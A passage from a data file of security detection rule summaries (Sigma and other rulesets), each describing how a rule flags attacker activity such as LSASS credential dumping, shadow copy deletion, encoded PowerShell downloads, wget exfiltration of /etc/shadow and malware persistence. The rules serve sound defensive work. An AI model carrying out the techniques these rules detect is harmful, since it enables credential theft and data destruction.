  Rule-Body-Hash: 10cb4947c7af73ded64714f728449979
  Ruleset: sigmahq
  Summary: This rule detects the use of the WMI Command-line utility (`wmic.exe`)
    to perform system disk and volume reconnaissance on Windows systems. An adversary
    might use `wmic` to gather details about the system's volumes, such as their names,
    sizes, free space, and other disk-related information. Threat actors, including
    Volt Typhoon, have been observed employing this method to gain insights into system
    configurations. The rule specifically looks for the execution of `wmic.exe` with
    command-line parameters that include 'volume' or 'path win32_logicaldisk'.
  Updated-Date: '2024_09_04'
c7a74c80-ba5a-486e-9974-ab9e682bc5e4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 561d4d454a3f908de4c37410ca349539
  Ruleset: core
  Summary: This rule detects the creation of files with uncommon executable or script
    extensions, such as .bat, .cmd, .dll, .exe, .ps1, and others, by Microsoft Office
    applications like Excel, Word, Access, Publisher, PowerPoint, and Visio on Windows
    systems. It specifically monitors for these activities to identify potentially
    malicious behavior, such as the presence of malware like Sodinokibi (also known
    as REvil) ransomware. The rule excludes certain legitimate activities, such as
    files created in web service cache directories or related to Webex installations,
    to minimize false positives.
  Updated-Date: '2024_09_03'
c7c8aa1c-5aff-408e-828b-998e3620b341:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f183fbc31f31d7fbc9883301172c226c
  Ruleset: sigmahq
  Summary: This rule detects MSI package installations from potentially suspicious
    locations on Windows systems. Specifically, it monitors for installations initiated
    by the 'MsiInstaller' provider through Event IDs 1040 and 1042. The rule flags
    paths such as ':\Windows\TEMP\', '\\\\', '\Desktop\', '\PerfLogs\', and '\Users\Public\'.
    It excludes installations related to Windows Package Manager ('WinGet') and the
    'UpdHealthTools.msi' located in 'C:\Windows\TEMP\'. While legitimate installations
    from these directories can happen, establishing a baseline is recommended to minimize
    false positives.
  Updated-Date: '2024_09_04'
c7d16cae-aaf3-42e5-9c1c-fb8553faa6fa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 497739623068bae9ecad8a460e5358b6
  Ruleset: core
  Summary: This rule detects a failed installation of a Microsoft Exchange Transport
    Agent by monitoring event logs for specific entries. It focuses on events where
    the event ID is 6 and the data contains 'Install-TransportAgent'. The detection
    provides insight into installation issues that could indicate either a legitimate
    problem or potential security concerns. Persisted logs under the service 'msexchange-management'
    and the product 'windows' are analyzed to identify these events. The path of the
    assembly installation is useful for distinguishing between false positives and
    actual failed installations.
  Updated-Date: '2024_09_03'
c7d33b50-f690-4b51-8cfb-0fb912a31e57:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a6faad357aa0a057756f57b8edf8aa9c
  Ruleset: sigmahq
  Summary: This rule detects the execution of the SharpDPAPI tool based on specific
    CommandLine flags and PE metadata. SharpDPAPI is a C# implementation of some Data
    Protection API (DPAPI) functionalities derived from the Mimikatz project. The
    tool is used for privilege escalation and defense evasion tactics by interacting
    with various DPAPI-protected data such as backup keys, credentials, and master
    keys. The detection criteria include identifying processes with images or original
    file names ending in SharpDPAPI.exe, or command line arguments containing keywords
    and options related to SharpDPAPI's capabilities.
  Updated-Date: '2024_09_04'
c7da8edc-49ae-45a2-9e61-9fd860e4e73d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3279421ef52b3347f9567425c6bcdf50
  Ruleset: sigmahq
  Summary: This rule detects the execution of potentially unwanted tools, specifically
    from the Sysinternals suite such as PsExec and Procdump, by monitoring the creation
    of the "accepteula" registry key. Detection focuses on events including the creation
    of keys related to Sysinternals tools like Active Directory Explorer, Handle,
    LiveKd, Process Explorer, and others listed. It triggers based on the registry
    key creation event where the target object contains references to these tools
    and ends with '\EulaAccepted'. Legitimate use of Sysinternals tools should be
    filtered out.
  Updated-Date: '2024_09_04'
c7dcacd0-cc59-4004-b0a4-1d6cdebe6f3e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d091c58fbca12a017ebba614f7ba0654
  Ruleset: sigmahq
  Summary: This rule detects the disabling of administrative share creation at startup
    on Microsoft Windows NT operating systems. Administrative shares are hidden network
    shares that provide system administrators with remote access to all disk volumes
    on a network-connected system. It monitors changes in the Windows Registry under
    specific "LanmanServer\Parameters" keys where the DWORD value is set to zero,
    indicating the administrative shares are disabled.
  Updated-Date: '2024_09_04'
c7e91a02-d771-4a6d-a700-42587e0b1095:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e6e7b49d39a581880cdebd040155957d
  Ruleset: sigmahq
  Summary: This rule detects a network connection initiated by "Regsvr32.exe," a legitimate
    Windows utility that can be exploited by attackers for execution and defense evasion
    purposes. This type of activity might indicate an attempt to bypass security features
    like AppLocker. The focus is on identifying the use of "regsvr32.exe" to establish
    network connections, which may be suspicious or indicative of malicious behavior.
  Updated-Date: '2024_09_04'
c803b2ce-c4a2-4836-beae-b112010390b1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11467fb0fd44357730afd7828bad8381
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new network route to a route table
    in Amazon Web Services (AWS) by monitoring events from the CloudTrail service.
    The detection focuses on events where the source is 'ec2.amazonaws.com' and the
    event name is 'CreateRoute'. This could indicate potential unauthorized modifications
    in network configurations, although legitimate activities such as creating a new
    Virtual Private Cloud (VPC) or adding new subnets can also trigger similar events.
  Updated-Date: '2024_09_04'
c830f15d-6f6e-430f-8074-6f73d6807841:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88732ec2f353df4d90679b6731f483ed
  Ruleset: core
  Summary: This rule detects changes in configuration files for syslog daemons on
    a Linux host. The monitored files include `/etc/syslog.conf`, `/etc/rsyslog.conf`,
    and `/etc/syslog-ng/syslog-ng.conf`. These modifications could indicate an attempt
    at defense evasion by altering logging behaviors. The rule specifically targets
    changes identified by the auditd service and captures executable, command, and
    key fields associated with these changes. While anomalous changes may be flagged,
    legitimate administrative activity may also trigger alerts.
  Updated-Date: '2024_09_03'
c83bf4b5-cdf0-437c-90fa-43d734f7c476:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a1a4364f5a6918d14e8cc9f5a97076a1
  Ruleset: core
  Summary: This rule detects the execution of a PowerShell script through the redirection
    of an input stream, which can be an indicator of various defense evasion and execution
    techniques. The detection focuses on processes involving 'powershell.exe' or 'pwsh.exe'
    where the command line includes a sequence indicating redirection ('- <'). This
    method is often used to bypass standard security measures and can signify potentially
    malicious activity on Windows systems, warranting further investigation.
  Updated-Date: '2024_09_03'
c8557060-9221-4448-8794-96320e6f3e74:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95494af3f33a2720d279e31132ccc555
  Ruleset: sigmahq
  Summary: This rule detects the usage of Windows PowerShell Web Access by identifying
    logs with user agents containing 'WindowsPowerShell/'. This activity is relevant
    for defense evasion and command-and-control techniques, as described in ATT&CK
    framework. Potential false positives may include legitimate administrative scripts
    that download files or retrieve content from websites.
  Updated-Date: '2024_09_04'
c86133ad-4725-4bd0-8170-210788e0a7ba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7e201834b9084e0aeba254f41a1b97ae
  Ruleset: core
  Summary: This rule detects suspicious PowerShell command line contents that exhibit
    abnormal casing in the "Net.Webclient" string (e.g., "nEt.WEbCliEnT"). Such casing
    anomalies are often used as an obfuscation technique to evade detection. The rule
    identifies these anomalies by matching against specific encoded command line patterns
    that contain variably cased strings mirroring "Net.Webclient". The detection is
    aimed at uncovering potential malicious activity leveraging command line obfuscation
    in the Windows environment.
  Updated-Date: '2024_09_03'
c86500e9-a645-4680-98d7-f882c70c1ea3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 992a0177e632d10607517ac3b5e70625
  Ruleset: core
  Summary: This rule detects the execution of AADInternals PowerShell Cmdlets. AADInternals
    is a tool used for administering Azure AD and Office 365, which can be exploited
    by malicious actors to compromise these platforms. It identifies processes initiated
    by PowerShell executables, specifically those utilizing cmdlets with the prefix
    "AADInt," which are indicative of AADInternals usage. The detection distinguishes
    various AADInternals commands, including those for adding, converting, disabling,
    enabling, exporting, getting, granting, installing, invoking, joining, creating,
    opening, reading, registering, removing, restoring, searching, sending, setting,
    starting, and updating within Azure AD and Office 365 environments.
  Updated-Date: '2024_09_03'
c8a180d6-47a3-4345-a609-53f9c3d834fc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e6ebd79f5a31f7643a80570df0c26354
  Ruleset: sigmahq
  Summary: This rule detects suspicious reconnaissance command line activity on Windows
    systems using the PowerShell Get-LocalGroupMember Cmdlet. The detection focuses
    on instances where specific group names, such as 'domain admins', 'administrator',
    'administrateur', 'enterprise admins', 'Exchange Trusted Subsystem', 'Remote Desktop
    Users', and their French and Spanish equivalents, are queried. This activity could
    indicate attempts to gather information about group memberships, potentially for
    privilege escalation. The rule helps identify potential security threats associated
    with unauthorized group membership reconnaissance.
  Updated-Date: '2024_09_04'
c8a5f584-cdc8-42cc-8cce-0398e4265de3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7af8cdcb852c83a4c6942270c13fd0cd
  Ruleset: core
  Summary: This rule detects attempts to exploit an Apache Spark server via CVE-2022-33891
    from a command-line perspective. The detection focuses on specific command line
    patterns containing `id -Gn \`` and `id -Gn '` executed from a Bash shell. This
    vulnerability, identified by CVE-2022-33891, involves shell command injection
    in Apache Spark, which may allow an attacker to gain unauthorized access or execute
    arbitrary commands on the server. The rule aims to identify these malicious attempts
    based on the process creation logs in a Linux environment, assessing them as high-risk
    with unlikely chances of false positives.
  Updated-Date: '2024_09_03'
c8b00925-926c-47e3-beea-298fd563728e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3593bc003acc1e2b698396d8747bee21
  Ruleset: sigmahq
  Summary: This rule detects the installation of various remote access tool services
    on Windows systems. These tools include AmmyyAdmin, Atera, BASupportExpressSrvcUpdater,
    BASupportExpressStandaloneService, chromoting, GoToAssist, GoToMyPC, jumpcloud,
    LMIGuardianSvc, LogMeIn, monblanking, Parsec, RManService, RPCPerformanceService,
    RPCService, SplashtopRemoteService, SSUService, TeamViewer, TightVNC, vncserver,
    and Zoho. The presence of these services is often exploited by threat actors for
    unauthorized remote access and persistence in a compromised environment. The detection
    focuses on EventID 4697, which logs new service installations, making it essential
    to monitor these events for enhanced security telemetry.
  Updated-Date: '2024_09_04'
c8da0dfd-4ed0-4b68-962d-13c9c884384e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9688d9f5a4e2965540ddea266778b21a
  Ruleset: core
  Summary: This rule detects a suspicious activity involving the cloning of the LSASS
    (Local Security Authority Subsystem Service) process, which may indicate an attempt
    at credential dumping. Credential dumping through LSASS is a technique used by
    attackers to extract passwords and authentication tokens from the system. The
    rule looks for instances where both the parent and child processes are LSASS.exe,
    as this behavior is atypical and can signify malicious intent aimed at accessing
    sensitive information. This detection is crucial for identifying potential security
    breaches involving the theft of credentials.
  Updated-Date: '2024_09_03'
c8e35e96-19ce-4f16-aeb6-fd5588dc5365:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef900f24253f7b85881eade3e2a091a9
  Ruleset: core
  Summary: This rule detects suspicious DNS error messages indicating potentially
    fatal or suspicious errors that could be caused by exploitation attempts. Specific
    messages identified include "dropping source port zero packet from," "denied AXFR
    from," and "exiting (due to fatal error)." These indicators can suggest attempts
    to exploit vulnerabilities in DNS services.
  Updated-Date: '2024_09_03'
c90362e0-2df3-4e61-94fe-b37615814cb1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 76df928f5337fd2a1ce23f74e2deb6d9
  Ruleset: sigmahq
  Summary: This rule detects changes to the Netsh registry key that involve adding
    a new DLL value, which may indicate an attempt to establish persistence by introducing
    a malicious Netsh helper.
  Updated-Date: '2024_09_04'
c9192ad9-75e5-43eb-8647-82a0a5b493e3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c08ae9d4f6ddfebf552bbb40b31870a8
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "Mouse Lock" tool on Windows systems.
    "Mouse Lock" is a legitimate software used for credential access and data collection,
    as noted in Kaspersky's 2020 Incident Response Analyst Report. The rule identifies
    instances where "Mouse Lock" is executed by looking for specific attributes within
    the process creation logs, such as the presence of 'Mouse Lock' in the product
    or command line, and 'Misc314' in the company field. While the software can have
    legitimate uses, its appearance might indicate suspicious activity related to
    credential theft or data exfiltration.
  Updated-Date: '2024_09_04'
c92c24e7-f595-493f-9c98-53d5142f5c18:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b65d9cf48a31f6144812fd56d7dd684
  Ruleset: core
  Summary: This rule detects when an unsigned image is loaded into the system, as
    observed by Windows Code Integrity. This could indicate a potential security risk
    because it suggests that a software component was loaded without proper verification
    of its source, increasing the possibility of malicious or unauthorized software
    execution. To mitigate this risk, checking with the publisher for a signed version
    of the image is recommended.
  Updated-Date: '2024_09_03'
c92f1896-d1d2-43c3-92d5-7a5b35c217bb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1151b2c2bdfc2d6b1e41b097e5003486
  Ruleset: emerging-threats
  Summary: This rule detects log entries indicative of exploitation attempts against
    Microsoft Exchange involving a remote code execution vulnerability identified
    as CVE-2021-42321. This vulnerability allows attackers to execute arbitrary code
    on the affected Exchange server. The rule focuses on specific event IDs and log
    data patterns, such as errors related to the 'Get-App' cmdlet and unhandled exceptions
    involving 'System.InvalidCastException.' This detection is crucial for identifying
    potential lateral movement and ensuring the security of Exchange services.
  Updated-Date: '2024_09_03'
c947b146-0abc-4c87-9c64-b17e9d7274a2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c22ecdcfa3036b42aa8d1e72c0401d67
  Ruleset: core
  Summary: This rule detects the deletion of Shadow Copies using specific operating
    system utilities on Windows. It monitors the execution of processes such as powershell.exe,
    pwsh.exe, wmic.exe, vssadmin.exe, and diskshadow.exe, as well as wbadmin.exe.
    The rule identifies command line activities involving terms like "shadow," "delete,"
    "catalog," "quiet," "resize," "shadowstorage," "unbounded," and "/MaxSize=" to
    flag potentially malicious actions. These detections could indicate an attempt
    to interfere with system backups, often associated with ransomware activities.
    Legitimate use cases, such as administrative maintenance tasks, may also trigger
    this rule.
  Updated-Date: '2024_09_03'
c977cb50-3dff-4a9f-b873-9290f56132f1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 53fffa491131bff02ffd89499654f04f
  Ruleset: sigmahq
  Summary: This rule detects the addition of an AppX package to the pipeline of "to
    be processed" packages when these packages are located in uncommon directories.
    It focuses on monitoring the AppX deployment server and aims to identify any events
    where the package path contains certain specified locations that are not typically
    used. This is particularly important because threat actors might exploit uncommon
    paths to deploy malicious packages for defense evasion. The rule filters common,
    legitimate paths to avoid false positives and ensures that only suspicious activities
    are flagged.
  Updated-Date: '2024_09_04'
c9783e20-4793-4164-ba96-d9ee483992c4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dbc65a9ebcc6ca48be4c59b5d6304c4a
  Ruleset: sigmahq
  Summary: This rule detects instances where the logged-on user's password is changed
    via the "ksetup.exe" utility on Windows systems. It identifies the use of "ksetup.exe"
    based on the process creation log and examines command lines that contain the
    "/ChangePassword" parameter. "Ksetup.exe" is a command-line tool used to configure
    Kerberos protocol settings, and this detection helps identify unauthorized or
    suspicious password changes using this utility.
  Updated-Date: '2024_09_04'
c98f2a0d-e1b8-4f76-90d3-359caf88d6b9:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 746fbcaa7e74100a41272249478055a6
  Ruleset: core
  Summary: This rule detects the usage of emojis in the command line, which can be
    an indicator of potential defense evasion activities. By monitoring for specific
    emojis within command lines on Windows systems, the rule aims to identify unusual
    behavior that may suggest an attempt to bypass security measures. This detection
    method is based on internal research and leverages the observation that certain
    characters, such as emojis, may be used to obfuscate commands and evade detection.
  Updated-Date: '2024_09_03'
c9a88268-0047-4824-ba6e-4d81ce0b907c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7cf20dfd27ec83393f46dc667accb56e
  Ruleset: core
  Summary: This rule detects an antivirus alert triggered by files located in highly
    relevant file paths or with specific file extensions. Monitored paths include
    directories such as PerfLogs, Temp, Users (Default and Public), Windows, web server
    directories (apache, nginx, tomcat, weblogic), and others associated with web
    server activity and user profiles. The files of interest include various script
    and executable file types, such as .aspx, .bat, .php, .sh, along with common image,
    text, and data formats like .jpeg, .png, .txt, and .xml. The goal is to identify
    potential malicious activities in critical and commonly targeted locations using
    these specific file types.
  Updated-Date: '2024_09_03'
c9b86500-1ec2-4de6-9120-d744c8fb5caf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28cb39707ea0c74249b6466709aad64b
  Ruleset: emerging-threats
  Summary: This rule detects modifications to the "Winlogon" registry key on Windows
    systems where the "Shell" value is altered to achieve persistence. Specifically,
    it identifies changes where the value contains certain parameters and executable
    patterns that have been observed in samples of the KamiKakaBot malware. The presence
    of these characteristics in the registry is an indication of potential malicious
    activity aimed at maintaining persistence on the infected machine.
  Updated-Date: '2024_09_03'
c9eb55c3-b468-40ab-9089-db2862e42137:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1bba7108423fb6f2b07c5d33f71d9b30
  Ruleset: sigmahq
  Summary: This rule detects the installation of a device that has been blocked by
    system policy. The detection is based on identifying Event ID 6423 within Windows
    security logs, indicating an enforcement of device installation restrictions.
    This event can signal attempts to connect unauthorized hardware to the system,
    aligning with initial access tactics used in cyber threats.
  Updated-Date: '2024_09_04'
c9fbe8e9-119d-40a6-9b59-dd58a5d84429:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c883e41775816a6e3404cb22dd816f7c
  Ruleset: sigmahq
  Summary: This rule detects potential ransomware activity or unauthorized Master
    Boot Record (MBR) tampering via the use of Bcdedit.exe, a command-line tool for
    managing Boot Configuration Data (BCD). It identifies suspicious or potentially
    harmful commands involving 'bcdedit.exe', such as 'delete', 'deletevalue', 'import',
    'safeboot', and 'network'. Such activities may indicate defense evasion, persistence
    mechanisms, or system manipulation consistent with ransomware behavior.
  Updated-Date: '2024_09_04'
ca2092a1-c273-4878-9b4b-0d60115bf5ea:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5884c900637c41baf359b91c0d4d3288
  Ruleset: core
  Summary: This rule detects suspicious PowerShell process starts that involve base64
    encoded commands, commonly associated with malware such as Emotet. It identifies
    specific instances where PowerShell or its alternative executables (pwsh.exe)
    are initiated, and the command line includes encoded parameters, signified by
    the presence of strings like ' -e' or similar encoded content patterns. The rule
    also accounts for standalone command line instances with reversed or encoded segments.
    It filters out cases where the execution policy is set to 'remotesigned', focusing
    instead on potentially harmful encoded command executions, signifying high-risk
    activities.
  Updated-Date: '2024_09_03'
ca387a8e-1c84-4da3-9993-028b45342d30:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 690ffb37154856e3ff49f70c59144fa2
  Ruleset: sigmahq
  Summary: This rule detects the execution of SoftPerfect's "netscan.exe," an application
    designed for network scanning. Threat actors actively use this tool in-the-wild
    to inspect and understand the network architecture of their victims.
  Updated-Date: '2024_09_04'
ca5583e9-8f80-46ac-ab91-7f314d13b984:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 84028711f67bb7267f3b2c64808259f7
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious child processes originating from
    KeyScrambler.exe. KeyScrambler.exe is a legitimate software program designed to
    encrypt keystrokes to protect against keyloggers. However, it can be exploited
    by attackers to execute malicious binaries. The rule triggers when KeyScrambler.exe
    spawns certain potentially malicious processes, such as cmd.exe, cscript.exe,
    mshta.exe, powershell.exe, pwsh.exe, regsvr32.exe, rundll32.exe, and wscript.exe.
    Identifying these abnormal child processes can help in detecting and mitigating
    execution, defense evasion, and privilege escalation threats.
  Updated-Date: '2024_09_04'
ca621ba5-54ab-4035-9942-d378e6fcde3c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1db0699a172b817efad5a94c7a4f30b2
  Ruleset: core
  Summary: This rule detects the execution of HandleKatz, a tool designed to create
    obfuscated memory dumps of the LSASS process by utilizing cloned handles. It identifies
    specific patterns in process creation on Windows systems, such as the presence
    of `loader.exe` and command lines containing `--pid:`. Additionally, it checks
    for specific import hashes and command line flags indicating attempts to generate
    dump files, particularly those referencing LSASS and obfuscation.
  Updated-Date: '2024_09_03'
ca8b77a9-d499-4095-b793-5d5f330d450e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8274feefffa8fa17fc6f94322fcce03b
  Ruleset: core
  Summary: This rule detects instances where PowerShell invokes a credential prompt.
    The detection is triggered by identifying the 'PromptForCredential' command within
    script blocks, which can indicate potential credential access and execution attempts
    that may correspond to malicious activities.
  Updated-Date: '2024_09_03'
ca9bf243-465e-494a-9e54-bf9fc239057d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8cb3b9967338475838ced7eb703459d9
  Ruleset: core
  Summary: This rule detects when a user has been elevated to manage all Azure Subscriptions,
    a change that should be investigated immediately if it is not planned. This setting
    might allow an attacker to gain access to all Azure subscriptions within an environment.
  Updated-Date: '2024_09_03'
caa02837-f659-466f-bca6-48bde2826ab4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 060029cd8528ea204cdcf8761d17b453
  Ruleset: sigmahq
  Summary: This rule detects potential Dynamic-Link Library (DLL) sideloading by identifying
    the loading of ClassicExplorer32.dll, a component of the Classic Shell software.
    DLL sideloading is a technique often used in attack vectors for defense evasion,
    persistence, and privilege escalation. The rule triggers when ClassicExplorer32.dll
    is loaded from a path that does not originate from the standard installation directory
    of Classic Shell, which is typically 'C:\Program Files\Classic Shell\'. This non-standard
    loading path can indicate that the DLL has been maliciously placed to exploit
    the system.
  Updated-Date: '2024_09_04'
caa06de8-fdef-4c91-826a-7f9e163eef4b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b891b72cbf804a523d27da750809b73e
  Ruleset: core
  Summary: This rule detects occurrences of RunDLL32.exe spawning explorer.exe as
    a child process, which is an uncommon behavior. This activity is often associated
    with the Gamarue malware, which uses this unusual method to launch the explorer.exe
    process. The rule identifies such events while excluding specific command-line
    instances related to normal Control Panel operations.
  Updated-Date: '2024_09_03'
cacef8fc-9d3d-41f7-956d-455c6e881bc5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19d7091d13e81c91ad6e384945643b78
  Ruleset: core
  Summary: This rule detects the creation of a PowerShell module where the module
    contents include the function "Get-VMRemoteFXPhysicalVideoAdapter". This activity
    might indicate the potential misuse of the "RemoteFXvGPUDisablement.exe" binary,
    which has known vulnerabilities associated with module load-order hijacking.
  Updated-Date: '2024_09_03'
cad1fe90-2406-44dc-bd03-59d0b58fe722:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9800a4119375b1c73ba68c7763edbfe9
  Ruleset: core
  Summary: This rule detects the use of the NPPSpy hacktool, which stores cleartext
    passwords of users that have logged in to a local file. It monitors for file events
    on Windows where the target file's name ends with either '\NPPSpy.txt' or '\NPPSpy.dll',
    indicating the presence of the tool.
  Updated-Date: '2024_09_03'
cae6cee6-0244-44d2-84ed-e65f548eb7dc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed12a49e6903dc3d3331d78c565aa21a
  Ruleset: emerging-threats
  Summary: This rule detects the execution of `rundll32.exe` leading to external network
    connections, which is an indicator of the Pikabot malware initiating command and
    control (C2) communication using hard-coded Windows binaries such as `SearchFilterHost.exe`,
    `SearchProtocolHost.exe`, `sndvol.exe`, `wermgr.exe`, and `wwahost.exe`.
  Updated-Date: '2024_09_03'
caf02a0a-1e1c-4552-9b48-5e070bd88d11:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6743aab72ba4335af90e36aa3bfc674f
  Ruleset: core
  Summary: This rule detects the creation of a TXT file on a user's desktop by the
    Windows command line utility, `cmd.exe`. This behavior is indicative of ransomware
    activity, specifically when the ransomware creates a ransom note in the form of
    a TXT file in the user's desktop directory. The detection focuses on events where
    the target filename is located within the user's desktop path and has a `.txt`
    extension.
  Updated-Date: '2024_09_03'
caf201a9-c2ce-4a26-9c3a-2b9525413711:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 16026610e83bb4152d0ee24b244a1291
  Ruleset: core
  Summary: This rule detects potentially suspicious usage of the WMI class "Win32_NTEventlogFile"
    from a PowerShell script. This class can be utilized in ways that might indicate
    malicious activity, such as deleting, backing up, or changing permissions of event
    log files. Specific functions of interest include `.BackupEventlog(`, `.ChangeSecurityPermissions(`,
    `.ChangeSecurityPermissionsEx(`, `.ClearEventLog(`, `.Delete(`, `.DeleteEx(`,
    `.Rename(`, `.TakeOwnerShip(`, and `.TakeOwnerShipEx(`. Detecting these function
    calls can help identify attempts to manipulate event logs, which could be a technique
    for evading detection or covering malicious actions.
  Updated-Date: '2024_09_03'
cafeeba3-01da-4ab4-b6c4-a31b1d9730c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dd0863a35b1b8a37df26697725697229
  Ruleset: core
  Summary: This rule detects the execution of PrintBrm.exe, a legitimate Windows utility
    typically used for printer migration tasks, which can also be leveraged to create
    or extract ZIP files. The use of this binary on a standard workstation is unusual
    and may indicate malicious activity, particularly in the context of command-and-control
    or defense evasion techniques.
  Updated-Date: '2024_09_03'
cb062102-587e-4414-8efa-dbe3c7bf19c6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5727ee1c4ad54aa40d769e120ace97c1
  Ruleset: emerging-threats
  Summary: This rule detects the installation of a service named "javamtsup" on a
    Windows system. The CosmicDuke info stealer, known for its data theft capabilities,
    uses this specifically named Windows service for establishing persistence on the
    infected system. Event ID 4697 in the security logs will highlight these malicious
    installations, flagging potential unauthorized access and indicating a critical
    security risk.
  Updated-Date: '2024_09_03'
cb0fe7c5-f3a3-484d-aa25-d350a7912729:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 86cb8536c331adc7629a52e8d2bf5c80
  Ruleset: core
  Summary: This rule detects the execution of "odbcconf.exe" with the "INSTALLDRIVER"
    action when the specified driver does not have a ".dll" extension. This behavior
    is often used as a defense evasion technique. The rule triggers on process creation
    events where "odbcconf.exe" is launched, and the command line includes "INSTALLDRIVER"
    but excludes typical ".dll" extensions, signaling potential malicious activity.
  Updated-Date: '2024_09_03'
cb39d16b-b3b6-4a7a-8222-1cf24b686ffc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: be9b82b7a4ed2d5f6344b9adfb4f8277
  Ruleset: sigmahq
  Summary: This rule detects attempts to post a file using the wget utility. Adversaries
    may exploit misconfigured sudo permissions for wget to bypass permission restrictions
    and access sensitive files such as /etc/shadow.
  Updated-Date: '2024_09_04'
cb5a2333-56cf-4562-8fcb-22ba1bca728d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a7df087da8a9570721fdacfd413c201d
  Ruleset: sigmahq
  Summary: This rule detects instances where an encoded or obfuscated version of an
    IP address is used within a URL, particularly in conjunction with download commands
    such as Invoke-WebRequest, wget, or curl. Encoded versions can include hexadecimal,
    octal, and other numerical representations. The detection focuses on patterns
    where the command line contains these obfuscated IP formats and an HTTP/HTTPS
    address, excluding legitimate IP addresses. Obfuscated IP addresses may appear
    in different formats such as hex (e.g., '0x'), combined with specific downloading
    syntax, and in numerical forms that match certain regular expressions indicative
    of manipulation. The rule aims to identify potentially malicious download activities
    leveraging these obfuscation techniques while filtering out valid IP addresses
    to reduce false positives.
  Updated-Date: '2024_09_04'
cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 832afcaf5bd873a437b7077ac46d7a67
  Ruleset: sigmahq
  Summary: This rule detects the execution of "curl.exe" with the "--insecure" flag.
    The "--insecure" flag is used to skip SSL verification steps, which can potentially
    expose data to Man-in-the-Middle attacks. The rule monitors process creation logs
    in Windows systems, specifically looking for instances where "curl.exe" is executed
    with this flag in the command line. The use of this flag is typically seen in
    scenarios where access is needed to internal or poorly maintained development
    systems, but it can also indicate insecure data transfer practices that could
    be exploited for malicious purposes.
